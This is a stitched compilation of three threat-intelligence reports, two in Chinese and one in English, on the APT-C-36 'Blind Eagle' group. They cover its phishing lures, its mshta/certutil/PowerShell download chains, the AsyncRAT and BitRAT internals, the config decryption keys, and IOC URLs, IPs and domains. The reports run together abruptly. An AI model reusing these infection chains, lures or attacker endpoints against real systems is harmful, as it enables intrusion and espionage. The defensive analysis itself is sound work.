在早期的攻击活动中，盲眼鹰组织惯于将自身伪装成哥伦比亚国家民事登记处、哥伦比亚国家税务和海关总署等部门来对哥伦比亚的政府和金融机构进行攻击。而在本次攻击事件中，攻击者所使用邮件的伪装来源信息除了同该组织具有一定的重叠以外，还新增了一些哥伦比亚其他政府部门信息。具体详见表3-1。
诱饵伪装来源（ 2018 年4月-2019年2月 ）
诱饵伪装来源（ 2019 年9月-2020年7月 ）
哥伦比亚民事登记处
哥伦比亚民事登记处
哥伦比亚国家税务和海关总署
哥伦比亚国家税务和海关总署
哥伦比亚国家司法部门
哥伦比亚国家总检察院
哥伦比亚国家统计局
哥伦比亚移民局
哥伦比亚国家网络警察局
哥伦比亚卫生部
表3-1 来源信息
3.2.2 恶意附件文档
该组织擅于使用携带恶意宏的MHTML格式的word文档作为攻击载荷。在此次攻击活动中，我们观察到攻击者更改了初期的攻击策略，其先将带有短链接内容的PDF或RTF格式的恶意附件作为第一阶段的诱饵文档，再通过诱导受害者点击链接后，跳转到指定的服务器上下载恶意文档，该恶意文档是包含宏代码的word文档。从这些PDF/RTF格式的恶意附件在VT上的扫描结果（如图3-6）可以看到，它们的查杀率普遍偏低甚至为0。攻击者将这类低查杀率的恶意文档作为邮件附件，能在一定程度上达到绕过邮件网关的目的。
图3-6 VT查杀结果
3.2.3 域名使用偏好
我们将该组织在早期行动中使用的动态域名，与本次行动所使用的域名做对比分析，可以很清晰的看出，这些域名都是通过同一个动态域名商DNSEXIT注册的。此外，在本次事件中的域名“medicosta.linkpc.net”与2018年事件中的域名“medicosco.publicvm.com”相似度极高，由此猜测它们极有可能是由同一组织注册。
3.2.4 IP地址关联
根据我们在3.1小节中所分析的结果显示，攻击者所有关联域名的曾绑定和现绑定的IP地址，均由互联网运营商Unus.Ins公司提供，且大多数用作VPN服务。这与该组织在2018年的攻击事件中发送邮件时使用的VPN相关IP地址128.90.xxx.xxx网段完全相同，由此可以看出这极有可能是出自同一组织。
3.2.5 地理位置特性
从攻击者所使用的C&C基础设施来看，其所使用的所有IP地址（包括128.90.xxx.xxx、191.95.xxx.xxx、190.253.xxx.xxx及179.33.xxx.xxx等网段）均归属于哥伦比亚的ISP（如图3-7）。而这些IP地理位置也与该组织早期活动涉及的地理位置相同。
图3-7 IP地址的地理位置
基于该组织从伪装来源信息、诱饵文档、域名使用偏好、IP地址关联以及地理位置特性等方面的对比分析，我们初步推断本次的攻击行动来自“APT-C-36盲眼鹰”组织。
四、攻击载荷分析
图4-1显示了黑客组织在此次攻击活动中的整个流程。
图4-1 黑客攻击流程图
在初期阶段，该组织首先利用与其伪装来源有关的主题邮件，附加恶意文档一并发送给攻击目标。当受害者点击文档中的短链接时，其实际上是被重定向到下一阶段DOC文档的托管平台，从而执行下载流程。该DOC文档运行后会启动恶意宏代码，访问并解析执行指定的页面（html文件），随后从C&C服务器上下载payload文件，成功下载后立即执行。此payload会在内存中加载执行其解密后的DLL模块来实现第一阶段的功能，接着第二阶段的DLL模块再执行其解密后的EXE模块，为了隐藏恶意下发功能，第三阶段的EXE模块会将解密后的可执行PE文件（AsyncRAT远控木马）映射到傀儡进程中执行。最后，AsyncRAT木马程序与C&C服务器建立SSL通信，接收控制指令以实现其间谍活动。
攻击者为了隐藏其真实企图，采用多层模块嵌套和以不落地形式在内存中加载执行木马程序的手法，再结合该木马针对自身运行环境检测（如虚拟机、沙箱、反调试等）的功能，以避免其在自动化系统分析中暴露恶意行为。下文，我们从黑客组织近期攻击事件的案例中，选取一例进行详细的剖析。
4.1钓鱼邮件
图4-2展示了攻击者仿冒来自哥伦比亚国家卫生部的钓鱼邮件，邮件标题为“Usted hasido citado para una prueba obligatoria de (COVID-19)”（翻译后为：“您被要求参加强制性检测（COVID-19）”），正文内容是关于检测的相关问题（如图4-3），并声称邮件附件是检测时间和地点，以诱导受害者打开附件文档。
图4- 2 仿冒来自哥伦比亚国家卫生部的钓鱼邮件
图4- 3 邮件翻译后的内容
4.2恶意文档
黑客组织所使用的恶意文档包括PDF、RTF以及MHTML格式的DOC文档。其并未使用漏洞，而是通过嵌入的恶意宏代码来触发后续恶意行为。与该组织以往攻击手法不同的是，本次并未直接通过邮件传播MHTML格式的恶意文档，而是将包含一个跳转链接（该链接指向MHTML格式的恶意文档）的正常文档作为邮件附件来进行投递，以绕过邮箱网关的安全检测。
图4-4是4.1小节中的邮件附件，该pdf文件包含哥伦比亚国家卫生部的标志、一行文本信息（标注文档密码，实则无用）和一个名为“Ver comunicado”的跳转链接（如图X）。
图4-4 PDF文档跳转链接内容
当用户点击文档链接时，实际上攻击者是利用Acortarurl短链接服务平台将受害者重定向到其指定的服务器上，下载MHTML格式的word文档。图4-5为访问Acortarurl的流量内容。
图4- 5 Acortarurl的流量内容
虽然此案例中的恶意文档链接已失效，不过通过关联分析后，我们发现了其他相关的恶意文档。该文档同样是伪装成来自哥伦比亚国家卫生部，攻击者在文档正文利用西班牙语诱导用户点击“启用内容”按钮来查看检测时间和地点。具体内容如图4-6所示。
图4-6 内嵌VBA的DOC恶意文档内容
当我们查看该文档的VBA工程时，提示需要输入密码。解密后从宏代码的内容可以看到，当受害者启用宏功能后，恶意代码将自动执行Document_Open函数。具体内容如图4-7所示。
图4-7 恶意宏代码内容
该函数会利用Microsoft工具mshta.exe来解析“http://pastebin.com/raw/Xrp7W0V3”（放置在pastebin网址上的html恶意脚本文件）。具体内容如图4-8所示。
图4- 8 加密的HTML脚本文件内容
解密后的恶意脚本文件主要功能是利用Windows内置程序certutil.exe远程下载指定的EXE文件，然后将其保存至“%appdata%msts.exe”并执行该程序。
图4-9 解密后的HTML脚本文件内容
4.3 Payload
如上文所示，通过html恶意脚本下载并执行的“msts.exe”（C#编写并加入了大量的混淆）实际上是一个Dropper文件。“msts.exe”会从资源中解密出“DriverUpdate.dll”（C#编写）并在内存中反射加载该DLL模块来实现第一阶段的功能；接着第二阶段的“DriverUpdate.dll”再解密出其原始文件“msts.exe”中的另一个资源数据，然后执行解密后的“Cyrus.exe”模块；第三阶段的“Cyrus.exe”从自身资源中解密出Async RAT远控木马，并将其整个文件覆盖映射到当前进程中执行。最后，Async RAT木马程序与C&C服务器进行通信连接，连接成功则发送上线包请求上线，并等待接收控制指令。
4.3.1 第一阶段模块
“msts.exe”主要用于解密并在内存中加载下一阶段的功能模块。其将自身伪装成Intel无线驱动应用程序，并附有详细的文件说明和版本号（如图4-10），以此迷惑攻击目标。
图4- 10 “msts.exe”文件属性详细信息
该Dropper模块的入口点在WindowsFormsApplication1处（如图4-11），其首先通过调用SelectedCard类中的D_D_D_D函数对名为“xor4”的资源数据进行解密。
图4- 11 Dropper模块的入口函数
解密算法是循环异或运算，其固定密钥为“RR5IRBNF5F4GN7997QFBYY”，解密代码如图4-12所示。
图4-12 解密代码具体内容
在解密出PE文件后，Dropper模块则附加三个启动参数（“AcBRmi、S8epuew和IntelWireless”）来加载执行第二阶段的功能模块。
图4-13 加载执行功能代码
4.3.2 第二阶段模块
该阶段模块的文件名为“DriverUpdater.dll”，当此模块运行后，会提取和解密第一阶段Dropper模块中另一个资源文件“AcBRmi”，之后在内存中加载执行解密出的第三阶段的PE文件。
图4- 14 解密和执行PE文件的功能代码
解密算法依然是循环异或运算，其密钥为“CZysHnTTIiop”，解密代码如图4-15所示。
图4- 15 异或解密算法代码
4.3.3 第三阶段模块
此功能模块的文件名称是“Cyrus.exe”，其主要任务为解密和执行最终的远控木马。
（1）初始化阶段
在执行入口函数之前，该模块会在初始化Class3的私有成员变量byte_Data时，先调用Class1类的方法解密自身资源文件Kdgv。具体如图4-16所示。
图4- 16 解密资源文件
资源数据的首次解密采用简单的异或加密算法，固定密钥为"dXhhaxrqDcQ"，通过对资源数据的每个字节做简单的XOR运算完成第一次解密。解密函数的代码如图4-17所示。
图4- 17 解密函数代码内容
第一次解密前和解密后的资源数据如图4-18所示。
图4-18 首次解密前后的数据内容
之后再对第一次解密后的数据进行二次解密，前16位为解密密钥“0x19 0xEF 0xB6 0xB6 0xE7 0x7E 0x920x92 0x0D 0xA0 0xE0 0x95 0xAD 0x8F 0x6B 0x14”，后面紧跟着的是待解密密文。解密前后的数据内容如图4-19所示。
图4- 19 二次解密前后的数据内容
函数以16字节为循环，将密钥同密文依次进行按位异或，最终解密得到“Stub.exe”文件。解密函数代码如图4-29所示。
图4- 20 解密函数代码内容
除此之外，该模块还会将提取出的配置信息数据，分别赋值给它们所对应的私有成员变量，在我们分析的此案例中，其配置数据大部分的值都为0。具体内容如图4-21所示。
图4-21 配置信息数据内容
（2）执行主功能代码
该模块首先使用Assembly.GetEntryAssembly().Location获取当前进程的全路径。接着通过判断上文提到的部分私有成员变量值来决定要执行的流程分支，其中包括互斥体的创建、虚拟机和沙箱的检测、文件下载、拷贝自身等。在本案例样本中，根据其配置信息来看，此模块仅执行最后一项流程，调用smethod_11函数。代码如图4-22所示。
图4-22 代码执行流程
进入到smethod_11函数后，该模块先调用Class3.SelectPuppetProcess来选择后续执行的RAT载体。由于参数int_13的值为0，所以返回值为string_10（当前模块的全路径）。
图4-23 代码内容
在选择完RAT的傀儡进程后，该模块再调用smethod_9函数，其中参数1为自身进程的全路径，参数2为之前解密出的PE文件数据。首先，该模块重新创建一个自身新进程，然后卸载此进程映像，并把之前解密出的新PE头部，以及节数据依次写入到新进程模块中，最后修改OEP并启动运行（“Stub.exe”）。
图4-24 写入和执行新PE文件
4.3.4 RAT模块
如上文所述，被执行的名为“Stub.exe”的PE文件则是最终的RAT模块。通过分析和溯源后发现，该PE文件是用C#语言编写的AsyncRAT远控木马。除了远程桌面监控、键盘记录、进程管理、远程WebCam、远程Shell等功能以外，其还包括加密、反沙盒、反虚拟机、反分析和反调试等对抗模块。下面我们会对RAT中的核心部分做深入的分析。
图4-25远程程序AsyncRAT控制端
（1）初始化配置信息
木马程序通过调用Settings.InitializeSettings函数来初始化配置信息。从图4-26中的函数实现代码可以看到，其会提取出固定的密钥并使用AES256算法解密出所有的配置数据信息。包含端口号、Host信息、版本号、Pastebin信息、解密秘钥、SSL通信证书及证书签名等信息，之后调用Settings.VerifyHash函数对证书进行验证。
图4- 26 初始化配置信息
解密之后的配置信息如图4-27所示。
图4-27 配置信息详细内容
（2）检测运行环境
为了逃避沙箱/安全人员的检测，木马程序使用了各种识别沙箱/虚拟机的技术，用于判断自身程序所在的运行环境，如果发现是在虚拟环境，或是被调试状态，程序则直接退出。从而达到隐藏自身，规避检测的目的。下面是该木马使用到的技术。
VMWARE和VirtualBox虚拟机的检测。
图4- 28 虚拟机的检测
（3）安装机制
木马程序的安装机制包括进程唯一性判断、在宿主机的持久化设置和守护进程设置。该木马以解密配置信息中的MTX字串"AsyncMutex_s8H9OlmYu”为名来创建互斥体，以保证运行进程的唯一性。
图4- 32 创建互斥体
其还会判断当前执行文件路径与安装目录是否一致，如果相同，则代表该模块已安装过，安装功能便不再执行。如不相同，该木马则会通过对比系统中运行的进程名来确保运行进程的唯一性。具体代码如图4-33所示。
图4- 33 判断安装路径
之后，木马程序根据当前是否为管理员执行权限，来选择是通过安装计划任务还是写入开机自启动命令实现持久化。具体代码如图4-34所示。
图4-3 4 安装计划任务或添加自启动
在完成持久化操作后，木马程序将自身重新写入到安装目录下并命名为指定文件名（chromgoogle.exe）。然后再在临时目录下生成和执行.bat批处理脚本文件。该bat文件用于运行“chromgoogle.exe”可执行文件及自身删除。具体内容如图4-35所示。
图4-3 5 脚本文件内容
最后，木马程序通过提升当前进程权限及设置线程始终处于执行状态方式，来实现守护进程。
图4-36 进程守护实现代码
（4）上线机制
在安装机制设置完成后，木马程序则通过配置信息中的IP和端口与控制端服务器建立SSL协议连接。此时该木马会收集受感染主机的系统信息，并把这些信息压缩后作为上线包发送到C&C服务器。上线包的内容包含主机设备的用户名、系统版本号、管理员账号和木马程序当前执行路径、版本号、安装时间等相关信息。通过对木马程序的分析，我们发现上线包的长度是不固定的。启明星辰ADLab研究员在对上线包格式做解析、提取后，整理归纳出木马程序上线数据包格式和上线数据包内容格式。具体如表4-1和图4-37（其中“绿色横格”作为一组数据的分割线）所示。
其首先会对配置信息中“Pastebin”的值做判断，如果不为NULL，则使用webClient.DownloadString方法获取服务端的上线域名/IP和端口号（从“Pastebin”上提取）。部分代码如图4-38所示。
图4- 38 从“Pastebin”上提取上线域名和端口号
如果为NULL，则直接从配置信息中提取出对应的上线域名/IP和端口号（以逗号作为分隔符），这表明该木马程序是具有配置多个C2的功能，攻击者能够灵活地添加多个备用C2，即使其中一部分被阻断，也能够重获控制权。具体代码如图4-39所示。
图4-3 9 从配置信息中提取上线域名和端口号
木马程序在与控制端连接成功后，便开始调用自定义类方法IdSender.SendInfo方法，收集受感染主机和木马自身版本等相关信息，这些信息会被逐个的储存在MsgPack类中。获取设备信息代码如图4-40所示。
图4- 40 获取设备信息
在此之后，木马程序调用msgPack.Encode2Bytes函数对上线包数据进行封包。该函数首先会执行this.Encode2Stream方法，通过调试分析得知，由于该木马是使用map类型来存储上线数据，那么此处便会调用this.WriteMap方法来操作上线包。
图4- 41 调用this.WriteMap方法
木马程序封包功能主要是在Encode2Stream方法中实现，为了能更直观地将上线数据包处理流程展现给读者，我们以本案例作为参考，绘制出整个封包的流程图（如图4-42）。
图4-42 数据包封包流程图
我们通过对封包函数的交叉引用进行详细分析后，得出该木马程序的上线包（以及后续的心跳包和控制指令包）均采用此方式进行处理。需要特别注意的是，代表其子包的数量值（value）、名称和数据的长度值（value），实际上都是先对这些数据的真实值（num和len）做判断，再将真实值与对应的固定值相加，最后得出value值。发送包格式如表4-2所示（可结合图4-37理解）。
子包数量 （/组） 长度 （子包1name） 数据 （子包1name） 长度 （子包1data） 数据 （子包1data） 子包2 …
name_value
string_name
data_value
string_data
表4-2 数据包格式
图4-44 发送数据包
（5）心跳机制
木马程序通过使用Timer类实现了自身的心跳机制。其主要功能是每10到15秒向控制端发送心跳包，心跳包内容包含包名和被感染主机系统用户前台窗口信息。
图4-45 发送心跳包
由图4-45中的代码实现可见，该远程木马心跳包的数据是同样使用MsgPack.Encode2Byte方法进行封包处理的。
（6）远程控制
在针对木马程序处理控制命令部分进行详细分析时，我们发现在被控端木马的恶意代码中，并未包含任何远程指令的具体实现功能代码。于是我们针对控制端和被控端做进一步的调试和观察后，发现所有跟远程操作相关的功能代码，都是根据其功能进行归类且被封装在不同的DLL模块中。当控制端在执行远程操作时，则首先与被控端发送特定的数据包进行交互，接着再将压缩后的功能模块附加到数据包中发送给被控端，由被控端以不落地形式在内存中加载执行，来完成控制端指定的控制命令。通过采用“propelling in use，destory after use”的工作模式，攻击者既可以灵活地调整木马程序的配置信息，又能较有效地防止取证分析人员获取其核心攻击模块，且在一定程度上达到免杀和绕过安全机制的效果。图4-46是木马程序在执行控制命令时（以“远程控制桌面”指令为例），两端之间的具体操作流程图。
图4- 46 远程操作交互流程图
该远控木马程序总共有十几个可执行核心功能模块，其中包含远程桌面监控、Webcam监控、键盘记录、文件查找、远程shell、Bots Killer以及DDos攻击等功能。表4-3列出了所有模块的名称以及其所对应的功能。
Chat.dll
Extra.dll
Visit Website /Send MessageBox /Get Admin Privileges / Disable Windows Defender /Set Wallpaper
FileManager.dll
File Manager
FileSearcher.dll
File Searcher
LimeLogger.dll
Keylogger
Miscellaneous.dll
BotsKill /USB Spread /Seed Torrent /Remote Shell /DOS Attack /Execute.NET Code
Options.dll
Report Window
ProcessManager.dll
Process Manager
Recovery.dll
Password Recovery
RemoteCamera.dll
Webcam
RemoteDesktop.dll
Remote Desktop
SendFile.dll
Send File To Disk
SendMemory.dll
Send File To Memory
表4-3 核心模块功能解析
表4-4为部分攻击指令数据包的内容。其中黄色标注部分为：当控制端要执行远程控制操作时，其与被控端交互的通用数据包格式（除“string_SHA256”和“压缩后的二进制数据”以外，其他内容都相同），其余都是其他相关操作的信息指令。
“Packet”“plugin”
“DLL”“string_SHR256”（由C&C服务器发起）
------------------------------------------------------
“Packet”“SendPlugin”
“DLL”“string_SHR256”（由RAT发起）
------------------------------------------------------
“Packet”“plugin”
“DLL”“压缩后的二进制数据”
“Hash”“string_SHR256” （由C&C服务器发起）
动态回传各类控制指令功能模块数据包。
“Packet”“dos”
“Option”“postStart”
“Host”“string_host”
“Port”“string_port”
“Timeout”“string_timeout”
DDos攻击相关配置信息
“Packet”“fileManager”
“Command”“getPath”
“Path”“string_path”
------------------------------------------------------ “Packet”“fileManager”
“Command”“getDriver”
远程文件管理相关操作信息
“Packet”“keylogger”
“isON”“false”
键盘记录相关操作信息
“Packet”“processManager”
“Option”“Kill”
“ID”“string_id”
------------------------------------------------------ “Packet”“processManager”
“Option”“List”
进程管理相关操作信息
“Packet”“ShellWriteInput”
“WriteInput”“string_txt”
------------------------------------------------------ “Packet”“ShellWriteInput”
“WriteInput”“exit”
远程Shell执行相关操作信息
表4-4 攻击指令数据包解析
五、总 结
通过分析可以看出，“APT-C-36盲眼鹰”组织主要采用的手法是网络钓鱼攻击，即以使用带有社工伪装的邮件（仿冒国家政府部门）作为攻击入口，利用低查杀率的邮件附件（用于绕过邮箱网关）向目标主机投放后门程序。在侵入主机设备后，再通过多层嵌套加载、虚拟机沙箱检测及功能模块动态推送等技术手段，达到在目标主机上长期潜伏而不被发现的效果。同时，结合对该组织历史攻击武器的深入研究我们发现，为了应对不断进步的安全防御和检测，该黑客组织改进了其攻击策略，所使用的后门木马工具更复杂、对抗性更强，这表明该组织在持续地更新迭代恶意代码的功能和形态，并呈现出功能模块化的趋势。
鉴于该黑客组织长期通过钓鱼邮件以及OfficeVBA宏进行攻击的惯用手段，我们建议相关用户不要随意打开和下载未知来源的邮件附件及链接，做好邮件系统的防护，如有需要可通过打开Office文档中的：文件-选项-信任中心-信任中心设置-宏设置，来禁用一切宏代码执行。一旦系统或服务器出现异常行为，及时报告并请专业人员进行排查，以消除安全隐患。
IOC SHAR ·1
612b7cd95eb317c2931d89acfb1c99506d799d26
ee42b8a4b53c8363828b9bc732045aa248e1d64a
e9e0871d37d1765756175e8931eedadb3f210b9b
e9e0871d37d1765756175e8931eedadb3f210b9b
c277bb8d01cb3e9d18d5378c6f518f4faca508fb
b586969a25aca22612ff59978d3a6062663baa86
79bf3730a7089b5c108bad883c1cc9a3779cb366
128.90.112.142
128.90.112.231
128.90.105.72
https://acortaurl.com/diangovocestadodecuentadeudaquotamp___P
https://acortaurl.com/activarcedulaonlineregistraduriagovcoquotamp__
https://yip.su/2oTZk
https://acortaurl.com/pdfproceso00910020190976543
https://acortaurl.com/diangovcodocumentos2019deudaalafecha0393948amp_
启明星辰积极防御实验室（ADLab）
ADLab成立于1999年，是中国安全行业最早成立的攻防技术研究实验室之一，微软MAPP计划核心成员，“黑雀攻击”概念首推者。截止目前，ADLab已通过CVE累计发布安全漏洞近1100个，通过 CNVD/CNNVD累计发布安全漏洞900余个，持续保持国际网络安全领域一流水准。实验室研究方向涵盖操作系统与应用系统安全研究、移动智能终端安全研究、物联网智能设备安全研究、Web安全研究、工控系统安全研究、云安全研究。研究成果应用于产品核心技术研究、国家重点科技项目攻关、专业安全服务等。In 2019, we wrote a blog entry about a threat actor, likely based in Colombia, targeting entities in Colombia and other South American countries with spam emails. This threat actor is sometimes referred to as APT-C-36 or Blind Eagle. Since then, we have continued tracking this threat actor. In this blog entry, we share our new findings about APT-C-36’s ongoing spam campaign during that monitoring phase.
APT-C-36 has been known to send phishing emails to various entities in South America using publicly available remote access tools (RATs). Over time, the threat actor switches from one RAT to another. In the past, we have observed that APT-C-36 makes use of RATs such as:
njRAT
Imminent Monitor
A custom modified ProyectoRAT
Warzone RAT
Async RAT
Lime RAT
Remcos RAT
BitRAT
The delivery emails
APT-C-36 utilizes different ruses for their targets: Many of the fraudulent emails impersonate Colombia’s national directorate of taxes and customs, Dirección de Impuestos y Aduanas Nacionales (DIAN), a lure that the threat actor has used before. Such emails claim that a “seizure order to bank account has been issued,” further details are contained in the email attachment, and that the information is protected with password “dian” (Figure 1). In English, the attachment means “seizure order.pdf” and the email body translates to the following:
“Subject: we have sent a seizure order to the bank accounts matching your name
Dear taxpayer,
For your information, our intelligent IT system detected that your income statement at the Direccion de Impuestos y Aduanas DIAN has 180 days of arrears. For that reason, we will proceed as stated in the law, article 823 until 843-2.
We attach the information and your debt with the password : dian"
Figure 1. A delivery email impersonating Colombia’s national directorate of taxes and customs
Other fake emails in this campaign claim to contain a photo that would prove that the recipient’s partner is having an affair. In a similar fashion, the recipient is asked to open the email attachment named “attached picture.jpg” and use the password “foto” to view its contents (Figure 2). These emails lack proper punctuation and are badly written, which is a common feature in phishing attempts. In English, the email translates to the following:
“Hi how are you, I hope you're fine. I write this email to you as I don't dare telling you directly. Everyone knows except you, open your eyes, you are being cheated on and I don't like how others are laughing about you. I experienced a similar situation, that's why I don't like someone doing it to another person. You know me well, I prefer not to make trouble. I attached a picture where they are kissing, I know it's hard to look at, but it is better than to live a relationship where you believe it is all fine.
The picture was too big so I compressed it, you need Winzip or Winrar installed. I will write another email in the following says, I have more things to tell you.
I uploaded the picture with a password to avoid other people to look at it. The password is: foto".”
The sender’s email address is either a spoofed address impersonating DIAN, or a Hotmail.com address impersonating a fake female profile. The originating IP addresses always belong to a VPN provider.
The delivery documents
The delivery documents in these phishing emails are either a PDF file or DOCX file containing a link. We have found samples of these documents impersonating DIAN (Figure 3), and others impersonating Google Photos (Figure 4).
Hovering over the link will show that the link was generated from a URL shortener. As discussed in our last blog entry on this threat actor, APT-C-36 uses URL shorteners such as cort.as, acortaurl.com and gtly.to. These URL shorteners are capable of geographical targeting, so if a user from a country not targeted by the threat actors clicks on the link, they will be redirected to a legitimate website. The URL shorteners also have the ability to detect the major VPN services, in which case, the shortened link leads the users to a legitimate website instead of redirecting them to the malicious link, as illustrated in Figures 5 and 6.
Figure 5. Geographical targeting detects a non-Colombian IP or VPN, so the user is led to the real DIAN website
Figure 6. Geographical targeting detects a non-Colombian IP or VPN, so the user is led to the real Google Photos website
However, if the location criteria are met, then the user is redirected to a file hosting server and a file is automatically downloaded (Figure 7).
The downloaded file is a password-protected archive, the password for which is mentioned in the email, the email attachment, or both. These passwords are usually simple, such as “dian,” “foto,” or “1234.”
Payload
After deobfuscating the executable file within the password-protected archive, we are presented with a RAT called BitRAT. This RAT is not new, it has been previously analyzed by security researchers .
Upon analyzing the RAT, the most interesting part of this RAT is its configuration settings seen as an encrypted block of data (Figure 8). There are two hexadecimal strings within the main executable file in BitRAT: the longer string is the encrypted configuration, the shorter one is the first part of the key.
Unlike most other malware, BitRAT uses the Camellia cipher with an initialization vector (IV) of 0000000000000000.
Several computational steps are needed to obtain the final key. First, a magic value is computed from bytes found on fixed addresses, as shown in Figures 9 and 10.
Each byte is transformed using a simple computation formula, as shown below:
((((value-0x 08)*0x25) %0x7f)+ 0x7f)% 0x7f
This formula can be used to compute for the magic value through the following process:
For example, using the data from Figures 9 and 10 will result in the string “78hf326f87”.
This string is appended to the hardcoded string “38325a784d6f5630”, forming the string “38325a784d6f563078hf326f87”.
Afterward, a crc32 checksum is computed from “38325a784d6f563078hf326f87”, resulting in “d8e71d19”.
A value of 0x08 is added to the checksum, which then becomes “d8e71d21”.
The MD5 hash is computed from the checksum “d8e71d21”, forming “b50d97fb1e3d5fc9cc302384f5718714”.
The first half of this MD5 hash, “b50d97fb1e3d5fc9”, is the key for the Camellia cipher.
The configuration is decrypted to the following string, as shown in Figure 11, including a command-and-control (C&C) server and a port.
Affected regions and industries
The majority of the targets we discovered were located in Colombia, although some were from other South American countries such as Ecuador, Spain, and Panama. This is consistent with the use of Spanish in spear-phishing emails.
Although APT-C-36’s objective remains unclear, we posit that the threat actor carried out this campaign for financial gain. The campaign has affected multiple industries, primarily government, financial, and healthcare entities. We have also seen the campaign affect the finance, telecommunications, and energy, oil and gas industries.
Conclusion
Over the course of this investigation, we have found various new tactics, techniques, and procedures (TTPs) used by APT-C-36. Our research shows that they modify their methods frequently, as evidenced by their use of different link shorteners and RATs. While spear-phishing emails are the initial infection vector for this ongoing campaign, the threat actor is constantly changing their payloads and improving their techniques to avoid detection, such as their use of geolocation filtering.
APT-C-36 selects their targets based on location and most likely the financial standing of the email recipient. These, and the prevalence of the emails, lead us to conclude that the threat actor’s ultimate goal is financial gain rather than espionage.
Security Recommendations
Threat actors like APT-C-36 are constantly seeking new ways to deploy their malware and stay one step ahead of their victims’ defenses. To secure their data from spear-phishing attempts, companies can benefit from tools such as the Trend Micro™ Smart Protection Suites and Worry-Free™ Business Security solutions, which protect end-users and businesses from these kinds of threats by detecting and blocking malicious files, spam messages, and malicious URLs. They can also turn to tools like Trend Micro™ Email Security , a no-maintenance cloud solution that delivers continuously updated protection to stop spam, malware, spear phishing, ransomware, and advanced targeted attacks before they reach the network. It protects Microsoft Exchange, Microsoft Office 365, Google Apps, and other hosted and on-premises email solutions.
Indicators of Compromise
You can access the link here for the full list of IOCs.360威胁情报中心是全球领先的威胁情报共享、分析和预警平台，依托360安全大脑百亿级样本，万亿级防护日志等海量安全数据，整合360漏洞挖掘、恶意代码分析、威胁情报追踪等团队的安全能力，产出高质量的安全威胁情报，驱动安全的防御、检测和响应。
南美洲是世界第四大洲，拥有丰富的自然环境资源，但是由于历史原因导致殖民经济一直存在，战乱不断，政治不稳定，各国经常出现暴乱，伴随着南美洲的动乱，以及政治意见的不同，针对性的情报窃取攻击广泛存在，这类APT攻击持续性强，针对性明确，即使被安全厂商披露，也不会停止行动潜伏，应该时刻保持关注。
APT-C-36盲眼鹰组织是一个疑似来自南美洲的、主要针对哥伦比亚的APT组织，该组织自2018年持续发起针对哥伦比亚的攻击活动。
近日，360高级威胁研究院在日常情报挖掘中发现并捕获到了疑似盲眼鹰的攻击行动。 恶意文档最终释放RAT对中招机器进行远程控制，我们已经监控到有国外哥伦比亚用户受到了影响。
标题为 FACTURACION-PDF-10-AGOSTO-2021.xlam 的样本（MD5: 2e1b90807d12eb20c5d7bc495fca543a ） 被包含在多个压缩包中，压缩包的名字被伪装成了各种金融、政府相关标题，并且所有的文件名称都是西班牙语。
REVISION IMPORTANTE.tar
EMBARGO CUENTA DE AHORRO ENTREGA DE DOCUMENTO.tar
留置储蓄账户交单
CITACION FISCAL PENDIENTE .tar
MISDOCUMENTOS.tar
DIAN IMPUESTO EVADIDO DOCUMENTO.tar
AVISO GOBIERNO.tar
INVITACION DEPARTAMETAL GOBIERNO.tar
政府部门邀请
Aviso de Prafacidad FISCAL PENDIENTE.tar
待决税务行为通知
此次捕获到的恶意表格文档，内部没有内容，如果有不谨慎的用户随意点击了 “ 启用宏 ” 的按钮，其内部的宏代码就已经开始自动执行。
最后运行的是一段downloader脚本，首先利用循环尝试躲避沙箱检测，然后利用PowerShell的bitstransfer远程文件传输，下载后续载荷。
在我们尝试分析的时候，IP地址已经失效，我们通过公开威胁情报获取了后续的Dropper。
最后释放的RAT是商业开源的asyncRAT，其功能有剪贴板监控、键盘记录、进程管理、远程Shell、反沙箱、反虚拟机、反分析和反调试等。RAT为net样本，在目前的攻击中，越来越多的组织开始采用商业RAT，因为易于开发和维护，不需要APT组织花费大量的时间、精力去开发攻击组件，既避免了研发过程中的时间损耗，也免除了攻击组件可能出现的bug的麻烦，而且开源商业RAT难于溯源，很难通过一款市面常见的RAT来判断一次攻击的归属，这给安全厂商带来了新的难题。
首先通过sleep延时运行，可以过掉简单的沙箱、或者运行监控。
随后初始化配置信息，利用隐藏在样本中的密钥 使用AES256解密出所有配置信息 ，包括 端口、Host、 互斥体、 Pastebin 、证书信息等。
然后进行沙箱、虚拟机检测，如果判断条件成立，则直接推出，减少自身被分析、发现的可能性。
紧 接着创建互斥体,判断木马程序路径是否一致。
是否为管理员账户，以此来判断是通过计划任务还是写入注册表启动项实现持久化。
将自身重新写入指定目录并伪装成chrome，通过bat文件实现自身删除以及创建进程。
提升进程权限并阻止进程休眠。
与CC通信， 收集 中招机器 的 相关 信息，并把这些信息压缩后发送到C&C ，包括 用户名、系统版本、管理员账号 、 当前路径等相关信息。
Async可以通过多种方式与CC通信，第一种是利用通过下载得到CC的域名端口，第二种则是直接从配置信息中解密CC与端口。
在木马上线后会通过 Timer 定时 持续 发送心跳包 。
后续所有远控 功能代码，都是被封装在不同的DLL模块中 有选择性的下发； 并且在中招机器上 以内存加载执行 ，这样做能够 有效 的 免杀和绕过安全机制 。
在盲眼鹰的活动中，钓鱼邮件一直是其重要的攻击前置手段，钓鱼邮件也是APT攻 击入口的重要手段，大多数用户安全意识不强，很容易被伪装邮件以及伪装的文档、欺骗性标题所迷惑，在毫无防范的情况下被攻陷，进而泄漏机密文件、重要情报，影响政治、经济、军事的走向与决定。 数字化时代已至，我们提醒广大用户有效预防可能存在的网络环境信息泄露等安全问题。
2e1b90807d12eb20c5d7bc495fca543a 8a4e17f2a30047f307ea3c956e04d4ac deae11179f4c80cf07c96280548fb843 6057ce35bd926dd6d49dedfa9cc18372 9e7da50f37da059fd98e5841d7acdd4c javierandresparramojica09[.]duckdns[.]org 201.219.204[.]73
360 高级威胁研究院
